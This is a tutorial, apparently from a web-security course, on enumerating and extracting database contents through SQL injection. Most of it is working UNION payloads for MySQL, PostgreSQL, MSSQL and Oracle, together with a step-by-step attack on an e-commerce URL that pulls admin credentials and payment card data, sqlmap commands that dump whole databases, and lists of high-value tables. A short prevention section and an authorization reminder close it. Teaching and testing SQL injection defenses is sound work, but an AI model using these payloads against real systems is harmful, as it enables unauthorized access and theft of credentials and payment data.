# Examining the Database in SQL Injection Attacks

To exploit SQL injection effectively, you need to understand the database structure. This guide shows you how to enumerate databases, tables, and columns.

## Why Examine the Database?

Before extracting data, you need to know:
1. **Database type and version** (MySQL, PostgreSQL, MSSQL, Oracle)
2. **Table names** (what tables exist?)
3. **Column names** (what data is in each table?)
4. **Data types** (for UNION attacks)

## Step 1: Determine Database Type and Version

### Method 1: Error Messages

Trigger an error and look for clues:

```sql
'
```

**MySQL Error:**
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

**PostgreSQL Error:**
```
ERROR: unterminated quoted string at or near "'"
```

**MSSQL Error:**
```
Unclosed quotation mark after the character string
Microsoft SQL Server
```

### Method 2: Version Query (UNION Attack)

| Database | Version Query |
|----------|---------------|
| MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |

**Example (MySQL):**
```sql
' UNION SELECT @@version,NULL,NULL--
```

**Result:**
```
8.0.27-0ubuntu0.20.04.1
```

**Complete Example:**
```
URL: http://example.com/product?id=1
Payload: http://example.com/product?id=1' UNION SELECT @@version,NULL,NULL--
```

## Step 2: List All Tables

Most databases use `information_schema` to store metadata.

### List Tables Query

| Database | Query |
|----------|-------|
| MySQL | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| PostgreSQL | `SELECT tablename FROM pg_tables WHERE schemaname='public'` |
| MSSQL | `SELECT name FROM sys.tables` |
| Oracle | `SELECT table_name FROM all_tables` |

### Example: MySQL

**Determine column count first:**
```sql
' ORDER BY 1--  ‚úì
' ORDER BY 2--  ‚úì
' ORDER BY 3--  ‚úó Error (2 columns)
```

**List tables:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Result:**
```
products
users
orders
admin_users
credit_cards
```

**Filter to current database only:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### Example: PostgreSQL

```sql
' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--
```

### Example: MSSQL

```sql
' UNION SELECT name,NULL FROM sys.tables--
```

### Example: Oracle

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

**Note:** Oracle table names are usually UPPERCASE.

## Step 3: List Columns in a Table

Once you know the table name, get its columns.

### List Columns Query

| Database | Query |
|----------|-------|
| MySQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| MSSQL | `SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users')` |
| Oracle | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` |

### Example: Get Columns from 'users' Table

**MySQL/PostgreSQL:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Result:**
```
user_id
username
password
email
role
created_at
```

**MSSQL:**
```sql
' UNION SELECT name,NULL FROM sys.columns WHERE object_id = OBJECT_ID('users')--
```

**Oracle:**
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

## Step 4: Extract Data

Now that you know the structure, extract the data!

**Example: Extract usernames and passwords**
```sql
' UNION SELECT username,password FROM users--
```

**Result:**
```
admin | $2y$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa
user1 | $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
john  | $2y$10$kJO3d8F3K0L3A8G5H3J3k.jY9k3jF8K3L9jK3F8k3L9Jk3F8K3L9
```

## Complete Attack Example

### Scenario: E-commerce Site

**URL:** `http://shop.example.com/product?id=5`

**Step 1: Confirm SQLi**
```
?id=5'
‚Üí Error! Vulnerable
```

**Step 2: Determine column count**
```
?id=5' ORDER BY 1--  ‚úì
?id=5' ORDER BY 2--  ‚úì
?id=5' ORDER BY 3--  ‚úì
?id=5' ORDER BY 4--  ‚úó Error
‚Üí 3 columns
```

**Step 3: Find string columns**
```
?id=5' UNION SELECT 'a',NULL,NULL--  ‚úì (column 1 is string)
?id=5' UNION SELECT NULL,'a',NULL--  ‚úì (column 2 is string)
?id=5' UNION SELECT NULL,NULL,'a'--  ‚úó Error (column 3 is numeric)
```

**Step 4: Get database version**
```
?id=5' UNION SELECT @@version,NULL,NULL--
‚Üí MySQL 8.0.27
```

**Step 5: List tables**
```
?id=5' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
‚Üí products, users, orders, admin_users, payment_methods
```

**Step 6: List columns in 'admin_users' table**
```
?id=5' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='admin_users'--
‚Üí id, username, password, email, privileges
```

**Step 7: Extract admin credentials**
```
?id=5' UNION SELECT username,password,NULL FROM admin_users--
‚Üí admin | $2y$10$vI8aWBnW3fID...
‚Üí superadmin | $2y$10$92IXUNpkjO0r...
```

**Step 8: Extract payment methods**
```
?id=5' UNION SELECT card_number,cvv,expiry FROM payment_methods--
‚Üí JACKPOT! (Don't do this - it's illegal!)
```

## Database-Specific Enumeration

### MySQL Complete Enumeration

```sql
-- Database version
' UNION SELECT @@version,NULL--

-- Current database name
' UNION SELECT database(),NULL--

-- All databases
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- All tables in current database
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- All columns in a table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- All columns with data types
' UNION SELECT CONCAT(column_name,':',data_type),NULL FROM information_schema.columns WHERE table_name='users'--
```

### PostgreSQL Complete Enumeration

```sql
-- Version
' UNION SELECT version(),NULL--

-- Current database
' UNION SELECT current_database(),NULL--

-- All tables
' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--

-- All columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Current user
' UNION SELECT current_user,NULL--

-- List all users
' UNION SELECT usename,NULL FROM pg_user--
```

### MSSQL Complete Enumeration

```sql
-- Version
' UNION SELECT @@version,NULL--

-- Current database
' UNION SELECT DB_NAME(),NULL--

-- All databases
' UNION SELECT name,NULL FROM sys.databases--

-- All tables
' UNION SELECT name,NULL FROM sys.tables--

-- All columns in a table
' UNION SELECT name,NULL FROM sys.columns WHERE object_id = OBJECT_ID('users')--

-- Current user
' UNION SELECT SYSTEM_USER,NULL--
```

### Oracle Complete Enumeration

```sql
-- Version
' UNION SELECT banner,NULL FROM v$version--

-- Current user
' UNION SELECT USER,NULL FROM dual--

-- All tables (current user)
' UNION SELECT table_name,NULL FROM user_tables--

-- All tables (all accessible)
' UNION SELECT table_name,NULL FROM all_tables--

-- All columns in a table (UPPERCASE!)
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- All tablespaces
' UNION SELECT tablespace_name,NULL FROM dba_tablespaces--
```

## Advanced Techniques

### Concatenating Multiple Columns

When you have only one string column, concatenate data:

**MySQL:**
```sql
' UNION SELECT CONCAT(username,':',password),NULL FROM users--
‚Üí admin:hash123
```

**PostgreSQL:**
```sql
' UNION SELECT username||':'||password,NULL FROM users--
```

**MSSQL:**
```sql
' UNION SELECT username+':'+password,NULL FROM users--
```

**Oracle:**
```sql
' UNION SELECT username||':'||password,NULL FROM users--
```

### Filtering Results

**Only admin users:**
```sql
' UNION SELECT username,password FROM users WHERE role='admin'--
```

**Only recent records:**
```sql
' UNION SELECT username,password FROM users WHERE created_at > '2024-01-01'--
```

**Limit results:**
```sql
-- MySQL
' UNION SELECT username,password FROM users LIMIT 5--

-- PostgreSQL
' UNION SELECT username,password FROM users LIMIT 5--

-- MSSQL
' UNION SELECT TOP 5 username,password FROM users--

-- Oracle
' UNION SELECT username,password FROM users WHERE ROWNUM <= 5--
```

### Getting Row Count

```sql
' UNION SELECT COUNT(*),NULL FROM users--
‚Üí 1547 (number of users)
```

### Extracting Specific Row

**MySQL (get 3rd row):**
```sql
' UNION SELECT username,password FROM users LIMIT 2,1--
```

**PostgreSQL:**
```sql
' UNION SELECT username,password FROM users OFFSET 2 LIMIT 1--
```

**MSSQL:**
```sql
' UNION SELECT username,password FROM (
    SELECT ROW_NUMBER() OVER(ORDER BY id) AS row, username, password FROM users
) AS temp WHERE row = 3--
```

## Automation with SQLMap

```bash
# Enumerate databases
sqlmap -u "http://example.com/product?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://example.com/product?id=1" -D shop --tables

# Enumerate columns in a table
sqlmap -u "http://example.com/product?id=1" -D shop -T users --columns

# Dump table contents
sqlmap -u "http://example.com/product?id=1" -D shop -T users --dump

# Dump entire database
sqlmap -u "http://example.com/product?id=1" -D shop --dump-all
```

## Information Gathering Checklist

- [ ] Identify database type (error messages or version query)
- [ ] Get database version
- [ ] List all databases (if permitted)
- [ ] List all tables in target database
- [ ] Identify interesting tables (users, admin, customers, etc.)
- [ ] List columns in interesting tables
- [ ] Identify sensitive columns (password, email, credit_card, etc.)
- [ ] Extract data from target tables
- [ ] Check for admin/privileged accounts
- [ ] Document findings for report

## What to Look For

### High-Value Tables

```
users
admin_users
customers
employees
accounts
passwords
payment_methods
credit_cards
api_keys
tokens
sessions
config
settings
```

### High-Value Columns

```
password
email
ssn
credit_card_number
api_key
secret_key
access_token
private_key
salt
hash
```

## Prevention

**‚úÖ Secure Code:**
```php
// Use parameterized queries
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

**‚úÖ Additional Measures:**
- Least privilege database accounts (no access to information_schema if not needed)
- Disable error messages in production
- Input validation
- WAF (Web Application Firewall)
- Regular security audits

## Key Takeaways

1. **information_schema** is your friend (except Oracle)
2. **Always enumerate** before extracting data
3. **Database type matters** - queries differ between DBs
4. **Concatenation** helps when limited to one column
5. **SQLMap automates** the entire process
6. **Prevention is simple** - use parameterized queries!

## Next Steps

- Practice on [PortSwigger Labs](https://portswigger.net/web-security/sql-injection)
- Learn [Blind SQLi Techniques](../03-blind-sqli/)
- Master [Database-Specific Syntax](../05-cheat-sheets/database-specific-syntax.md)

---

**Remember: Only test on authorized systems!** üîê
